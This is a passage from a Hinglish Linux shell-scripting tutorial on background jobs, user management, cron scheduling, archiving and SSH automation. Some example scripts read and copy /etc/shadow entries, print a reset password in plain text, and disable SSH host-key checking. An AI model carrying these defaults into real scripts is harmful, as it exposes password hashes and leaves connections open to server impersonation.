            echo "Job $i started"
            sleep $((RANDOM % 10 + 1))
            echo "Job $i completed"
        ) &
    done
    
    wait
    echo "All jobs completed"
}

# Background with logging
background_with_log() {
    local script=$1
    local logfile=$2
    
    nohup "$script" > "$logfile" 2>&1 &
    local pid=$!
    
    echo "Started with PID $pid, logging to $logfile"
    echo $pid > /tmp/script.pid
}

# Cleanup background jobs
cleanup_jobs() {
    echo "Cleaning up background jobs..."
    
    # Kill all background jobs
    jobs -p | xargs -r kill 2>/dev/null
    
    echo "Cleanup complete"
}

main() {
    local action=${1:-parallel}
    
    case $action in
        parallel)
            parallel_tasks
            ;;
        queue)
            job_queue
            ;;
        *)
            echo "Usage: $0 {parallel|queue}"
            ;;
    esac
}

# Trap to cleanup on exit
trap cleanup_jobs EXIT

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`nohup` bhoolna:** Terminal close hone par job terminate
- ❌ **Too many jobs:** System overload
- ❌ **Output redirect nahi:** Terminal clutter

### 10. **Best Practices / Pro Tips**
- 💡 **`nohup` for persistence:** Terminal close ke baad bhi chale
- 💡 **Redirect output:** `> output.log 2>&1`
- 💡 **`wait` for sync:** All jobs complete hone ka wait
- 💡 **Limit parallel jobs:** System resources manage

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Parallel backup script

backup_databases() {
    local databases=("db1" "db2" "db3" "db4")
    local backup_dir="/backups"
    
    echo "Starting parallel backups..."
    
    for db in "${databases[@]}"; do
        (
            echo "Backing up $db..."
            mysqldump "$db" | gzip > "$backup_dir/${db}_$(date +%Y%m%d).sql.gz"
            echo "✓ $db backup complete"
        ) &
    done
    
    # Wait for all backups
    wait
    
    echo "✓ All backups completed"
}

backup_databases
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `&` run in background
- ✅ `Ctrl+Z` pause job
- ✅ `jobs` list jobs
- ✅ `fg` bring to foreground
- ✅ `bg` resume in background

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `nohup` kya karta hai?**
A: Terminal close hone ke baad bhi process chalta rahta hai.

**Q2: Background job ka output kahan jata hai?**
A: Terminal par, redirect karo: `command > output.log &`

**Q3: All background jobs kaise kill karu?**
A: `jobs -p | xargs kill`

### 14. **Practice ke liye Task**

```bash
# 1. Background
sleep 100 &

# 2. List jobs
jobs

# 3. Pause (Ctrl+Z)
sleep 100
# Press Ctrl+Z

# 4. Resume background
bg

# 5. Foreground
fg

# 6. With nohup
nohup long_script.sh &
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔄 `&` runs in background
- ⏸️ Ctrl+Z pauses job
- 📋 jobs lists background jobs
- ⏩ fg/bg control jobs
- 🎯 Essential for multitasking

> **💡 Ye Zaroor Yaad Rakhein:**
> Background jobs productivity booster! `&` for background, `nohup` for persistence. Output redirect karo. `wait` for synchronization. Parallel processing powerful!

---

## **Topic 8: User Management (`useradd`, `usermod -aG`, `userdel -r`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**User Management** - System users create, modify, aur delete karna.

### 2. **Ye Kya Hai? (What is it?)**
User management commands system users ko manage karte hain. `useradd` new user banata hai, `usermod` existing user modify karta hai, `userdel` user delete karta hai. Multi-user systems ke liye essential.

**Analogy:** User management ek building ka access control hai - kaun andar aa sakta hai, kya kar sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Security** - Access control
- ✅ **Multi-user** - Multiple users manage
- ✅ **Permissions** - Role-based access
- ✅ **Audit** - User activity track

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- New user onboarding
- Permission changes
- User offboarding
- Group management

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Security issues
- Access problems
- Orphaned files
- Audit failures

### 6. **Syntax aur Common Options**

```bash
# Add user
useradd username
useradd -m username         # Create home directory
useradd -s /bin/bash user   # Set shell
useradd -G group user       # Add to group

# Modify user
usermod -aG group user      # Add to group (append)
usermod -s /bin/zsh user    # Change shell
usermod -L user             # Lock account
usermod -U user             # Unlock account

# Delete user
userdel username            # Delete user
userdel -r username         # Delete with home directory

# Password
passwd username             # Set password
passwd -l username          # Lock password
passwd -u username          # Unlock password
```

### 7. **Example 1 (Basic)**

```bash
# Create user
sudo useradd john
sudo useradd -m -s /bin/bash jane  # With home and shell

# Set password
sudo passwd john

# Add to group
sudo usermod -aG sudo john         # Add to sudo group
sudo usermod -aG docker jane       # Add to docker group

# Check user
id john
groups john

# Modify shell
sudo usermod -s /bin/zsh john

# Lock user
sudo usermod -L john

# Delete user
sudo userdel john                  # Keep home directory
sudo userdel -r jane               # Remove home directory

# List users
cat /etc/passwd
cut -d: -f1 /etc/passwd

# List groups
cat /etc/group
groups
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# User management automation

set -euo pipefail

# Create user with setup
create_user() {
    local username=$1
    local fullname=$2
    local groups=$3
    
    echo "Creating user: $username"
    
    # Create user
    useradd -m -s /bin/bash -c "$fullname" "$username"
    
    # Set password
    echo "Setting password..."
    passwd "$username"
    
    # Add to groups
    IFS=',' read -ra GROUP_ARRAY <<< "$groups"
    for group in "${GROUP_ARRAY[@]}"; do
        usermod -aG "$group" "$username"
        echo "✓ Added to group: $group"
    done
    
    # Setup SSH
    local ssh_dir="/home/$username/.ssh"
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    chown "$username:$username" "$ssh_dir"
    
    echo "✓ User $username created successfully"
}

# Bulk user creation
bulk_create_users() {
    local user_file=$1
    
    while IFS=',' read -r username fullname groups; do
        if id "$username" &>/dev/null; then
            echo "⚠️  User $username already exists"
        else
            create_user "$username" "$fullname" "$groups"
        fi
    done < "$user_file"
}

# Disable inactive users
disable_inactive() {
    local days=${1:-90}
    
    echo "Disabling users inactive for $days days..."
    
    lastlog -b "$days" | tail -n +2 | while read line; do
        local username=$(echo "$line" | awk '{print $1}')
        
        if [ "$username" != "root" ]; then
            echo "Disabling: $username"
            usermod -L "$username"
        fi
    done
}

# User audit
audit_users() {
    echo "=== User Audit ==="
    
    # Users with sudo access
    echo "Users with sudo access:"
    grep -Po '^sudo.+:\K.*$' /etc/group
    
    # Users with no password
    echo ""
    echo "Users with no password:"
    awk -F: '($2 == "") {print $1}' /etc/shadow
    
    # Users with UID 0
    echo ""
    echo "Users with UID 0 (root privileges):"
    awk -F: '($3 == "0") {print $1}' /etc/passwd
    
    # Locked users
    echo ""
    echo "Locked users:"
    passwd -S -a | grep " L "
}

# Cleanup old users
cleanup_users() {
    local days=${1:-180}
    
    echo "Finding users inactive for $days days..."
    
    lastlog -b "$days" | tail -n +2 | while read line; do
        local username=$(echo "$line" | awk '{print $1}')
        
        if [ "$username" != "root" ]; then
            echo "User: $username"
            read -p "Delete this user? (y/n): " confirm
            
            if [ "$confirm" = "y" ]; then
                userdel -r "$username"
                echo "✓ Deleted: $username"
            fi
        fi
    done
}

# Reset user password
reset_password() {
    local username=$1
    
    echo "Resetting password for $username..."
    
    # Generate random password
    local password=$(openssl rand -base64 12)
    
    echo "$username:$password" | chpasswd
    
    # Force password change on next login
    passwd -e "$username"
    
    echo "✓ Password reset"
    echo "Temporary password: $password"
}

# User backup
backup_user() {
    local username=$1
    local backup_dir="/backups/users"
    
    mkdir -p "$backup_dir"
    
    # Backup home directory
    tar -czf "$backup_dir/${username}_$(date +%Y%m%d).tar.gz" \
        "/home/$username"
    
    # Backup user info
    grep "^$username:" /etc/passwd > "$backup_dir/${username}_passwd"
    grep "^$username:" /etc/shadow > "$backup_dir/${username}_shadow"
    
    echo "✓ User $username backed up"
}

# Offboard user
offboard_user() {
    local username=$1
    
    echo "Offboarding user: $username"
    
    # Backup first
    backup_user "$username"
    
    # Lock account
    usermod -L "$username"
    
    # Expire account
    usermod -e 1 "$username"
    
    # Kill user processes
    pkill -u "$username" || true
    
    echo "✓ User $username offboarded"
}

main() {
    local action=${1:-help}
    
    case $action in
        create)
            create_user "$2" "$3" "$4"
            ;;
        audit)
            audit_users
            ;;
        disable)
            disable_inactive "$2"
            ;;
        offboard)
            offboard_user "$2"
            ;;
        *)
            echo "Usage: $0 {create|audit|disable|offboard} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`-aG` bhoolna:** `-G` without `-a` removes other groups
- ❌ **Home directory nahi banana:** `-m` use karo
- ❌ **Root user modify karna:** Dangerous!

### 10. **Best Practices / Pro Tips**
- 💡 **Always `-aG`:** Groups add karte waqt
- 💡 **`-m` for home:** Home directory create karo
- 💡 **Backup before delete:** User data preserve
- 💡 **Audit regularly:** Security check

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# New developer onboarding

onboard_developer() {
    local username=$1
    local fullname=$2
    
    echo "Onboarding developer: $fullname"
    
    # Create user
    useradd -m -s /bin/bash -c "$fullname" "$username"
    
    # Set password
    passwd "$username"
    
    # Add to groups
    usermod -aG sudo,docker,developers "$username"
    
    # Setup SSH
    mkdir -p "/home/$username/.ssh"
    chmod 700 "/home/$username/.ssh"
    
    # Setup development environment
    su - "$username" -c "
        git config --global user.name '$fullname'
        git config --global user.email '$username@company.com'
    "
    
    # Grant access to repositories
    usermod -aG git "$username"
    
    echo "✓ Developer onboarded successfully"
}

onboard_developer "john" "John Doe"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `useradd -m` create user
- ✅ `usermod -aG` add to group
- ✅ `userdel -r` delete user
- ✅ `passwd` set password
- ✅ Always backup before delete

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `-aG` vs `-G` kya fark hai?**
A: `-aG` append karta hai, `-G` replace karta hai.

**Q2: User ka home directory kahan hai?**
A: `/home/username` (default)

**Q3: User delete karne par files kya hota hai?**
A: `-r` ke bina files rahti hain, `-r` se delete.

### 14. **Practice ke liye Task**

```bash
# 1. Create user
sudo useradd -m john

# 2. Set password
sudo passwd john

# 3. Add to group
sudo usermod -aG sudo john

# 4. Check user
id john

# 5. Delete user
sudo userdel -r john

# 6. List users
cut -d: -f1 /etc/passwd
```

### 15. **Aakhri Choti Summary (5 lines)**
- 👤 useradd creates users
- ✏️ usermod modifies users
- 🗑️ userdel deletes users
- 🔐 passwd sets passwords
- 🎯 Essential for multi-user systems

> **💡 Ye Zaroor Yaad Rakhein:**
> User management security ka part! `-aG` hamesha use karo groups ke liye. `-m` home directory ke liye. Delete se pehle backup. Audit regularly!

---

## **Topic 9: Scheduling (`cron`, `crontab -e`, `crontab -l`, `at`, `anacron`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Scheduling** - Tasks ko automatically scheduled time par run karna.

### 2. **Ye Kya Hai? (What is it?)**
Scheduling tools tasks ko specific time par automatically execute karte hain. `cron` recurring tasks ke liye, `at` one-time tasks ke liye, `anacron` missed tasks ke liye. Automation ka backbone.

**Analogy:** Scheduling ek alarm clock hai jo automatically kaam karta hai - aapko yaad rakhne ki zaroorat nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Automation** - Manual work eliminate
- ✅ **Consistency** - Regular tasks guaranteed
- ✅ **Efficiency** - Time save
- ✅ **Reliability** - Never forget

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Backups
- Log rotation
- System maintenance
- Report generation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual tasks (error-prone)
- Missed backups
- System degradation
- Inconsistent maintenance

### 6. **Syntax aur Common Options**

```bash
# Crontab
crontab -e              # Edit crontab
crontab -l              # List crontab
crontab -r              # Remove crontab
crontab -u user -e      # Edit for user

# Cron format
# * * * * * command
# │ │ │ │ │
# │ │ │ │ └─ Day of week (0-7, 0=Sunday)
# │ │ │ └─── Month (1-12)
# │ │ └───── Day of month (1-31)
# │ └─────── Hour (0-23)
# └───────── Minute (0-59)

# Examples
0 2 * * * /backup.sh        # Daily at 2 AM
*/15 * * * * /check.sh      # Every 15 minutes
0 0 * * 0 /weekly.sh        # Weekly on Sunday
0 0 1 * * /monthly.sh       # Monthly on 1st

# at command
at 10:30                    # Run at 10:30
at now + 1 hour             # Run in 1 hour
at 2:00 PM tomorrow         # Tomorrow at 2 PM
```

### 7. **Example 1 (Basic)**

```bash
# Edit crontab
crontab -e

# Add jobs
# Backup daily at 2 AM
0 2 * * * /usr/local/bin/backup.sh

# Check every 5 minutes
*/5 * * * * /usr/local/bin/health_check.sh

# Weekly report on Monday at 9 AM
0 9 * * 1 /usr/local/bin/weekly_report.sh

# Monthly cleanup on 1st at midnight
0 0 1 * * /usr/local/bin/cleanup.sh

# List crontab
crontab -l

# at command
echo "/usr/local/bin/task.sh" | at 10:30
at 2:00 PM tomorrow <<EOF
/usr/local/bin/report.sh
EOF

# List at jobs
atq

# Remove at job
atrm 1

# anacron (in /etc/anacrontab)
# period delay job-id command
1 5 daily-backup /usr/local/bin/backup.sh
7 10 weekly-report /usr/local/bin/report.sh
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Cron job management

set -euo pipefail

# Setup backup cron
setup_backup_cron() {
    local backup_script="/usr/local/bin/backup.sh"
    local time="0 2 * * *"  # 2 AM daily
    
    # Add to crontab
    (crontab -l 2>/dev/null; echo "$time $backup_script") | crontab -
    
    echo "✓ Backup cron job added"
}

# Setup monitoring cron
setup_monitoring() {
    local monitor_script="/usr/local/bin/monitor.sh"
    
    # Every 5 minutes
    (crontab -l 2>/dev/null; echo "*/5 * * * * $monitor_script") | crontab -
    
    echo "✓ Monitoring cron job added"
}

# Setup log rotation
setup_log_rotation() {
    local rotate_script="/usr/local/bin/rotate_logs.sh"
    
    # Daily at midnight
    (crontab -l 2>/dev/null; echo "0 0 * * * $rotate_script") | crontab -
    
    echo "✓ Log rotation cron job added"
}

# Setup weekly report
setup_weekly_report() {
    local report_script="/usr/local/bin/weekly_report.sh"
    
    # Monday at 9 AM
    (crontab -l 2>/dev/null; echo "0 9 * * 1 $report_script") | crontab -
    
    echo "✓ Weekly report cron job added"
}

# Remove cron job
remove_cron_job() {
    local pattern=$1
    
    crontab -l | grep -v "$pattern" | crontab -
    
    echo "✓ Cron job removed"
}

# List all cron jobs
list_cron_jobs() {
    echo "=== Current Cron Jobs ==="
    crontab -l
}

# Validate cron syntax
validate_cron() {
    local cron_line=$1
    
    # Basic validation
    local fields=$(echo "$cron_line" | awk '{print NF}')
    
    if [ "$fields" -lt 6 ]; then
        echo "✗ Invalid cron syntax"
        return 1
    fi
    
    echo "✓ Cron syntax valid"
}

# Schedule one-time task
schedule_once() {
    local script=$1
    local time=$2
    
    echo "$script" | at "$time"
    
    echo "✓ Task scheduled for $time"
}

# Backup crontab
backup_crontab() {
    local backup_dir="/backups/crontab"
    mkdir -p "$backup_dir"
    
    crontab -l > "$backup_dir/crontab_$(date +%Y%m%d).txt"
    
    echo "✓ Crontab backed up"
}

# Restore crontab
restore_crontab() {
    local backup_file=$1
    
    crontab "$backup_file"
    
    echo "✓ Crontab restored"
}

# Setup complete automation
setup_automation() {
    echo "=== Setting up automation ==="
    
    # Backup crontab first
    backup_crontab
    
    # Setup jobs
    setup_backup_cron
    setup_monitoring
    setup_log_rotation
    setup_weekly_report
    
    # Verify
    echo ""
    echo "=== Configured Jobs ==="
    crontab -l
    
    echo ""
    echo "✓ Automation setup complete"
}

main() {
    local action=${1:-help}
    
    case $action in
        setup)
            setup_automation
            ;;
        list)
            list_cron_jobs
            ;;
        backup)
            backup_crontab
            ;;
        remove)
            remove_cron_job "$2"
            ;;
        *)
            echo "Usage: $0 {setup|list|backup|remove} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Path specify nahi karna:** Full paths use karo
- ❌ **Output redirect nahi:** Logs save karo
- ❌ **Environment variables:** Cron mein limited environment

### 10. **Best Practices / Pro Tips**
- 💡 **Full paths:** Always absolute paths
- 💡 **Redirect output:** `>> /var/log/cron.log 2>&1`
- 💡 **Test first:** Manually run before scheduling
- 💡 **Email notifications:** Set `MAILTO` variable

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production automation setup

# Crontab configuration
cat > /tmp/production_crontab <<'EOF'
# Environment
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=admin@example.com

# Backups
0 2 * * * /usr/local/bin/backup_databases.sh >> /var/log/backup.log 2>&1
0 3 * * * /usr/local/bin/backup_files.sh >> /var/log/backup.log 2>&1

# Monitoring
*/5 * * * * /usr/local/bin/health_check.sh >> /var/log/health.log 2>&1
*/10 * * * * /usr/local/bin/disk_check.sh >> /var/log/disk.log 2>&1

# Cleanup
0 0 * * * /usr/local/bin/cleanup_logs.sh >> /var/log/cleanup.log 2>&1
0 1 * * 0 /usr/local/bin/cleanup_temp.sh >> /var/log/cleanup.log 2>&1

# Reports
0 9 * * 1 /usr/local/bin/weekly_report.sh >> /var/log/reports.log 2>&1
0 9 1 * * /usr/local/bin/monthly_report.sh >> /var/log/reports.log 2>&1

# Security
0 4 * * * /usr/local/bin/security_audit.sh >> /var/log/security.log 2>&1
EOF

# Install crontab
crontab /tmp/production_crontab
echo "✓ Production crontab installed"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `crontab -e` edit jobs
- ✅ `* * * * *` time format
- ✅ Full paths always
- ✅ Redirect output
- ✅ Test before scheduling

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Cron job run nahi ho rahi?**
A: Full paths use karo, logs check karo, permissions verify karo.

**Q2: `*/5` ka matlab kya hai?**
A: Every 5 minutes.

**Q3: Cron vs at kab use karu?**
A: cron recurring ke liye, at one-time ke liye.

### 14. **Practice ke liye Task**

```bash
# 1. Edit crontab
crontab -e

# 2. Add daily job
0 2 * * * /path/to/script.sh

# 3. Every 15 minutes
*/15 * * * * /path/to/check.sh

# 4. List jobs
crontab -l

# 5. Schedule with at
echo "/path/to/script.sh" | at 10:30

# 6. List at jobs
atq
```

### 15. **Aakhri Choti Summary (5 lines)**
- ⏰ cron for recurring tasks
- 📅 `* * * * *` time format
- 🔂 at for one-time tasks
- 📝 Full paths essential
- 🎯 Automation backbone

> **💡 Ye Zaroor Yaad Rakhein:**
> Cron automation ka heart! Full paths hamesha use karo. Output redirect karo. Test manually pehle. Backup crontab regularly. Production mein essential!

---

## **Topic 10: Archiving (`tar`, `gzip`, `zip`, `bzip2`, `xz`, `base64`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Archiving** - Files ko compress aur archive karna.

### 2. **Ye Kya Hai? (What is it?)**
Archiving tools files ko combine aur compress karte hain. `tar` files bundle karta hai, `gzip`/`bzip2`/`xz` compress karte hain, `zip` both karta hai, `base64` encode karta hai. Backup aur transfer ke liye essential.

**Analogy:** Archiving ek suitcase pack karna hai - sab cheezein ek jagah, compressed aur portable.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Space saving** - Disk space bachao
- ✅ **Transfer** - Easy file transfer
- ✅ **Backup** - Data preservation
- ✅ **Organization** - Files bundle karo

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Backups
- File transfers
- Log archiving
- Distribution packages

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Disk space waste
- Slow transfers
- Disorganized files
- Inefficient backups

### 6. **Syntax aur Common Options**

```bash
# tar
tar -czf archive.tar.gz files/      # Create gzip
tar -cjf archive.tar.bz2 files/     # Create bzip2
tar -cJf archive.tar.xz files/      # Create xz
tar -xzf archive.tar.gz             # Extract gzip
tar -tzf archive.tar.gz             # List contents

# gzip
gzip file.txt                       # Compress
gzip -d file.txt.gz                 # Decompress
gunzip file.txt.gz                  # Decompress

# zip
zip archive.zip files               # Create
unzip archive.zip                   # Extract
zip -r archive.zip directory/       # Recursive

# bzip2
bzip2 file.txt                      # Compress
bunzip2 file.txt.bz2                # Decompress

# xz
xz file.txt                         # Compress
unxz file.txt.xz                    # Decompress

# base64
base64 file.txt > encoded.txt       # Encode
base64 -d encoded.txt > file.txt    # Decode
```

### 7. **Example 1 (Basic)**

```bash
# Create tar.gz archive
tar -czf backup.tar.gz /home/user/documents/

# Extract tar.gz
tar -xzf backup.tar.gz

# List contents
tar -tzf backup.tar.gz

# Create tar.bz2 (better compression)
tar -cjf backup.tar.bz2 /home/user/

# Extract to specific directory
tar -xzf backup.tar.gz -C /restore/

# Compress single file
gzip large_file.log
# Creates: large_file.log.gz

# Decompress
gunzip large_file.log.gz

# Zip directory
zip -r website.zip /var/www/html/

# Unzip
unzip website.zip

# Base64 encode
echo "secret" | base64
# Output: c2VjcmV0Cg==

# Base64 decode
echo "c2VjcmV0Cg==" | base64 -d
# Output: secret
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Advanced archiving automation

set -euo pipefail

readonly BACKUP_DIR="/backups"
readonly DATE=$(date +%Y%m%d_%H%M%S)

# Create compressed backup
create_backup() {
    local source=$1
    local name=$(basename "$source")
    local archive="$BACKUP_DIR/${name}_${DATE}.tar.gz"
    
    echo "Creating backup of $source..."
    
    tar -czf "$archive" "$source" 2>/dev/null
    
    local size=$(du -h "$archive" | cut -f1)
    echo "✓ Backup created: $archive ($size)"
}

# Incremental backup
incremental_backup() {
    local source=$1
    local snapshot="$BACKUP_DIR/snapshot.snar"
    local archive="$BACKUP_DIR/incremental_${DATE}.tar.gz"
    
    tar -czf "$archive" -g "$snapshot" "$source"
    
    echo "✓ Incremental backup created"
}

# Compress logs
compress_logs() {
    local log_dir=${1:-/var/log}
    
    echo "Compressing logs in $log_dir..."
    
    find "$log_dir" -name "*.log" -mtime +7 ! -name "*.gz" | while read log; do
        gzip "$log"
        echo "✓ Compressed: $log"
    done
}

# Archive and encrypt
archive_encrypt() {
    local source=$1
    local archive="$BACKUP_DIR/encrypted_${DATE}.tar.gz.gpg"
    
    tar -czf - "$source" | gpg -c > "$archive"
    
    echo "✓ Encrypted archive created: $archive"
}

# Split large archive
split_archive() {
    local source=$1
    local size=${2:-100M}
    
    tar -czf - "$source" | split -b "$size" - "$BACKUP_DIR/archive_${DATE}.tar.gz.part"
    
    echo "✓ Archive split into parts"
}

# Verify archive
verify_archive() {
    local archive=$1
    
    echo "Verifying archive: $archive"
    
    if tar -tzf "$archive" > /dev/null 2>&1; then
        echo "✓ Archive is valid"
        return 0
    else
        echo "✗ Archive is corrupted"
        return 1
    fi
}

# Compare archives
compare_archives() {
    local archive1=$1
    local archive2=$2
    
    diff <(tar -tzf "$archive1" | sort) <(tar -tzf "$archive2" | sort)
}

# Rotate backups
rotate_backups() {
    local keep_days=${1:-30}
    
    echo "Rotating backups older than $keep_days days..."
    
    find "$BACKUP_DIR" -name "*.tar.gz" -mtime +$keep_days -delete
    
    echo "✓ Old backups removed"
}

# Backup with exclusions
backup_exclude() {
    local source=$1
    local archive="$BACKUP_DIR/backup_${DATE}.tar.gz"
    
    tar -czf "$archive" \
        --exclude='*.tmp' \
        --exclude='*.log' \
        --exclude='node_modules' \
        --exclude='.git' \
        "$source"
    
    echo "✓ Backup created with exclusions"
}

# Parallel compression
parallel_compress() {
    local dir=$1
    
    find "$dir" -name "*.log" -print0 | \
        xargs -0 -P 4 -I {} gzip {}
    
    echo "✓ Parallel compression complete"
}

# Create distribution package
create_package() {
    local app_dir=$1
    local version=$2
    local package="$BACKUP_DIR/app_v${version}_${DATE}.tar.gz"
    
    # Create archive
    tar -czf "$package" \
        --exclude='.git' \
        --exclude='*.log' \
        --exclude='node_modules' \
        "$app_dir"
    
    # Create checksum
    sha256sum "$package" > "${package}.sha256"
    
    echo "✓ Package created: $package"
}

# Restore from backup
restore_backup() {
    local archive=$1
    local destination=$2
    
    echo "Restoring from $archive to $destination..."
    
    # Verify first
    if ! verify_archive "$archive"; then
        echo "✗ Archive verification failed"
        return 1
    fi
    
    # Extract
    tar -xzf "$archive" -C "$destination"
    
    echo "✓ Restore complete"
}

main() {
    local action=${1:-help}
    
    case $action in
        backup)
            create_backup "$2"
            ;;
        compress)
            compress_logs "$2"
            ;;
        verify)
            verify_archive "$2"
            ;;
        rotate)
            rotate_backups "$2"
            ;;
        restore)
            restore_backup "$2" "$3"
            ;;
        *)
            echo "Usage: $0 {backup|compress|verify|rotate|restore} [args]"
            ;;
    esac
}

main "$@"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Flags order galat:** `-czf` sahi order
- ❌ **Overwrite original:** gzip original file replace karta hai
- ❌ **Path issues:** Relative vs absolute paths

### 10. **Best Practices / Pro Tips**
- 💡 **`tar -czf`:** Create gzip archive
- 💡 **Verify after creation:** `tar -tzf` se check
- 💡 **Exclude unnecessary:** `--exclude` use karo
- 💡 **Checksum create:** Integrity verify ke liye

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

```bash
#!/bin/bash
# Production backup system

readonly BACKUP_ROOT="/backups"
readonly RETENTION_DAYS=30
readonly DATE=$(date +%Y%m%d)

backup_production() {
    echo "=== Production Backup ==="
    
    # Database backup
    echo "Backing up databases..."
    mysqldump --all-databases | gzip > "$BACKUP_ROOT/db_${DATE}.sql.gz"
    
    # Application files
    echo "Backing up application..."
    tar -czf "$BACKUP_ROOT/app_${DATE}.tar.gz" \
        --exclude='*.log' \
        --exclude='node_modules' \
        /var/www/app/
    
    # Configuration files
    echo "Backing up configs..."
    tar -czf "$BACKUP_ROOT/config_${DATE}.tar.gz" \
        /etc/nginx/ \
        /etc/mysql/ \
        /etc/php/
    
    # Create checksums
    cd "$BACKUP_ROOT"
    sha256sum *_${DATE}.* > "checksums_${DATE}.txt"
    
    # Rotate old backups
    find "$BACKUP_ROOT" -name "*.tar.gz" -mtime +$RETENTION_DAYS -delete
    find "$BACKUP_ROOT" -name "*.sql.gz" -mtime +$RETENTION_DAYS -delete
    
    echo "✓ Backup complete"
}

backup_production
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `tar -czf` create archive
- ✅ `tar -xzf` extract archive
- ✅ `gzip` compress files
- ✅ `zip -r` for directories
- ✅ Verify after creation

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: tar.gz vs tar.bz2 vs tar.xz?**
A: gz fast, bz2 better compression, xz best compression.

**Q2: gzip original file delete kar deta hai?**
A: Haan, `-k` use karo keep karne ke liye.

**Q3: Encrypted archive kaise banau?**
A: `tar -czf - files | gpg -c > archive.tar.gz.gpg`

### 14. **Practice ke liye Task**

```bash
# 1. Create tar.gz
tar -czf backup.tar.gz /home/user/

# 2. Extract
tar -xzf backup.tar.gz

# 3. List contents
tar -tzf backup.tar.gz

# 4. Compress file
gzip file.txt

# 5. Zip directory
zip -r archive.zip directory/

# 6. Base64 encode
echo "text" | base64
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📦 tar bundles files
- 🗜️ gzip/bzip2/xz compress
- 📁 zip does both
- 🔐 base64 encodes
- 💾 Essential for backups

> **💡 Ye Zaroor Yaad Rakhein:**
> Archiving backup ka foundation! tar -czf create ke liye, tar -xzf extract ke liye. Verify hamesha karo. Exclusions use karo. Checksums banao integrity ke liye!

---

## **Topic 11: Remote Automation (`ssh`, `scp`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Remote Automation** - Remote servers par commands aur files transfer.

### 2. **Ye Kya Hai? (What is it?)**
SSH (Secure Shell) remote servers par secure connection aur command execution karta hai. SCP (Secure Copy) files securely transfer karta hai. Remote automation ka backbone.

**Analogy:** SSH ek secure phone line hai remote server se baat karne ke liye, SCP ek secure courier service hai files bhejne ke liye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Remote management** - Servers remotely manage
- ✅ **Automation** - Scripts remotely execute
- ✅ **File transfer** - Secure data transfer
- ✅ **Security** - Encrypted communication

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Remote server management
- Deployment automation
- File synchronization
- Distributed systems

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manual server access
- Insecure transfers
- No automation
- Inefficient management

### 6. **Syntax aur Common Options**

```bash
# SSH
ssh user@host                       # Connect
ssh user@host command               # Execute command
ssh -p 2222 user@host               # Custom port
ssh -i key.pem user@host            # With key

# SCP
scp file.txt user@host:/path/       # Upload file
scp user@host:/path/file.txt .      # Download file
scp -r directory/ user@host:/path/  # Upload directory
scp -P 2222 file.txt user@host:/    # Custom port

# SSH keys
ssh-keygen                          # Generate key
ssh-copy-id user@host               # Copy public key
```

### 7. **Example 1 (Basic)**

```bash
# Connect to server
ssh john@server.com

# Execute command
ssh john@server.com "ls -la"

# Multiple commands
ssh john@server.com "cd /var/www && ls -la"

# Copy file to server
scp backup.tar.gz john@server.com:/backups/

# Copy file from server
scp john@server.com:/logs/app.log ./

# Copy directory
scp -r website/ john@server.com:/var/www/

# With custom port
ssh -p 2222 john@server.com
scp -P 2222 file.txt john@server.com:/

# Generate SSH key
ssh-keygen -t rsa -b 4096

# Copy public key
ssh-copy-id john@server.com

# SSH config (~/.ssh/config)
Host myserver
    HostName server.com
    User john
    Port 2222
    IdentityFile ~/.ssh/id_rsa

# Use config
ssh myserver
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Remote automation framework

set -euo pipefail

readonly SERVERS=(
    "web1.example.com"
    "web2.example.com"
    "db1.example.com"
)

# Execute command on remote server
remote_exec() {
    local server=$1
    local command=$2
    
    echo "Executing on $server: $command"
    
    ssh -o StrictHostKeyChecking=no "$server" "$command"
}

# Execute on all servers
exec_all() {
    local command=$1
    
    for server in "${SERVERS[@]}"; do
